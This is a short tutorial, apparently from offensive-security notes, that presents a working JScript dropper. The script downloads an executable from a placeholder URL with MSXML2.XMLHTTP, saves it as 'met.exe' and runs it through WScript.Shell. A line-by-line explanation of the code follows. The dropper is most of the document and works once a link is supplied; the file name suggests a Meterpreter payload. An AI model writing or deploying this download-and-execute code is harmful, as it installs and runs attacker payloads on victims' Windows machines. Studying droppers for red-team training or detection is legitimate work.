# Basic Dropper in JScript

- To perform a HTTP GET Request, we can use the MSXML2.XMLHTTP Object which is based on Microsoft XML Core Services.
- We would be using CreateObject method of the Windows Script Host to instantiate the MSXML2.XMLHTTP Object.

JScript Code :

    var url = "<link to exe file>"
    var Object = WScript.CreateObject('MSXML2.XMLHTTP');
    Object.Open('GET', url, false);
    Object.Send();
    if (Object.Status == 200)
    {
        var Stream = WScript.CreateObject('ADODB.Stream');
        Stream.Open();
        Stream.Type = 1;
        Stream.Write(Object.ResponseBody);
        Stream.Position = 0;
        Stream.SaveToFile("met.exe", 2);
        Stream.Close();
    }
    var r = new ActiveXObject("WScript.Shell").Run("met.exe");

Explanation :

1. We first store the link to the exe file in a variable called url
2. Next we create the Object of MSXML2.XMLHTTP
3. We then create a GET Request to the link
4. Next we send the GET request with Object.Send() command.
5. If the Object Status is 200, that means it was a success and the file was found.
6. We then create a Stream to copy the response into it and save it to a file
7. Using the _ActiveXObject_, we execute a shell command were we execute the exe file.

&nbsp;

> Documentation :
>
> - https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms767625%28v%3dvs.85%29
> - https://www.w3schools.com/asp/ado_ref_stream.asp
> - https://en.wikipedia.org/wiki/ActiveX

&nbsp;
